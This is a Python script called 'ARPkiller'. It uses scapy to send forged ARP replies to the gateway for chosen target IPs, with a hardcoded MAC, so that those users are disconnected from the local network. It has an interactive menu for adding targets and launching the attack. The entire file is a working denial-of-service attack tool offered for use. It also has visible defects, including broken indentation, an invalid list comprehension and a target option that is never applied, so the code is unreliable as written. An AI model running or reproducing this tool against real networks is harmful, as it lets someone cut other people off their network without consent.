#!/usr/env/python3

from scapy.all import *
import os
import sys
import threading
import signal
import getopt
import re
import time

DEFAULT_PACKET_PER_MIN = 6

def usage():
    print("ARPkiller - Disconnect users from the network")
    print()
    print("Flags:")
    print("{} - colon (:) seperated list of target ip addresses".format("\t-t --targets".ljust(20," ")))
    print("{} - number of packets to send per minute (default: 6)".format("\t-p --packets".ljust(20," ")))
    print()


def main():

    # scapy config
    conf.verb = 0
    
    # If being used in command line mode
    if len(sys.argv) > 1:
        try: 
            opts,args = getopt.getopt(sys.argv[1:],"t:p:",["targets","packets"])
        except getopt.GetoptError as e:
            print(str(e))
            usage()
        target_string = ""
        packets_per_min = DEFAULT_PACKET_PER_MIN
        for o,a in opts:
            if o in ("-t","--targets"):
                target_list = a
                print(target_list)
            elif o in ("-p","--packets"):
                packets_per_min = int(a)
            else:
                print("[!] Invalid option {} with value {}".format(o,a))
                sys.exit(1)

        if packets_per_min <= 0:
            print("[!] Packets per minute must be a positive integer")
            sys.exit(1)
        target_list = []
        
        target_list = add_targets(target_list, target_string)

        if target_list:
            attack(target_list, packets_per_min)
         else:
            sys.exit(1)
    else:
        
        print("APRkiller - Disconnect them from the network")
        print()

        target_list = []
        packets_per_min = DEFAULT_PACKET_PER_MIN
        gateway = get_gateway_ip()
        print()
        help()
        while True: 
            option = input("<ARPkiller:#> ").lower()
            if option == "help":
                help()
            elif option == "list":
                list_targets(target_list)
            elif "add" in option:
                add_list = option.replace("add","").strip()
                target_list = add_targets(target_list, add_list)
            elif "remove" in option: 
                remove_list = option.replace("remove","").strip()
                target_list = remove_targets(target_list, remove_list)
            elif "packets" in option:
                option = option.replace("packets","").strip()
                packets_per_min = int(option)
            elif option == "attack":
                attack(target_list, packets_per_min)
            else:
                print("[-] Invalid option selected, type help for a list of options")


def attack(target_list, packets_per_min):
    gateway_ip = get_gateway_ip()
    gateway_mac = get_mac(gateway_ip)

    print("[+] Starting attack [CTRL-C to stop]")

    while True:
        try:
            for target in target_list:
                poison_target(target, gateway_ip)
            time.sleep(60/packets_per_min)
        except KeyboardInterrupt:
            for target in target_list:
                restore_target(target, gateway_ip, gateway_mac)
            print("[+] Shutting down attack")
            sys.exit(0)


def add_targets(current_list, ip_list):
    if re.match(r'^\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}(:\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}){0,}$', ip_list):
        ip_list = ip_list.split(":")
        print("[+] Added IPs to target list")
        return current_list + ip_list
    else:
        print("[!] Invalid list of targets, should be colon (:) seperated IP addresses")
        return current_list


def remove_targets(current_list, ip_list):
    if re.match(r'^\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}(:\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}){0,}$', ip_list):
        print("[+] Removed IPs from target list")
        ip_list = ip_list.split(":")
        return [x for x in current_list if not in ip_list]
    else:
        print("[!] Invalid list of targets, should be colon (:) seperated IP addresses")
        return current_list


def help():
    print("Commands:")
        print("{} - Lists available commands".format("help".ljust(20," ")))
        print("{} - Lists selected targets".format("list".ljust(20," ")))
        print("{} - Adds target(s), seperate IPs with a colon (:)".format("add <ip_list>".ljust(20," ")))
        print("{} - Removes target(s), seperate IPs with a colon (:)".format("remove <ip_list>".ljust(20," ")))
        print("{} - Sets packets per minute (default: 6)".format("packets <number>".ljust(20," ")))
        print("{} - Begins the attack".format("attack".ljust(20," ")))



def poison_target(target, gateway_ip):
    packet = ARP()
    packet.op = 2
    packet.psrc = target 
    packet.pdst = gateway_ip
    packet.hwsrc = '4c:d1:f9:ba:7a:58'
    #packet.hwdst = '4c:d1:f9:ba:7a:58'
    #packet.psrc = gateway_ip
    #packet.pdst = target
    #packet.hwsrc = '4c:d1:f9:ba:7a:58'
    #packet.hwdst = '4c:d1:f9:ba:7a:58'

    print("[+] Poisoning {}".format(target))
    send(packet)


def restore_target(target, gateway_ip, gateway_mac):
    packet = ARP()
    packet.op = 2
    packet.psrc = gateway_ip
    packet.pdst = target
    packet.hwsrc = gateway_mac

    print("[+] Restoring target {}".format(target))
    send(packet)

def get_mac(ip_address):
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)

    for s,r in responses:
        return r[Ether].src

    return None


def get_gateway_ip():
    try:
        print("[+] Looking for gateway ip")
        gateway = sr1(IP(dst="www.google.com", ttl=0) / ICMP() / "XXXXXXXXXXX", verbose=False)
        print("[+] Found gateway ip at {}".format(gateway.src))
        return gateway.src
    except:
        print("[-] Could not get gateway IP, please enter IP manually")
        return input("<APRkiller:#> Gateway IP: ")



if __name__ == '__main__':
    main()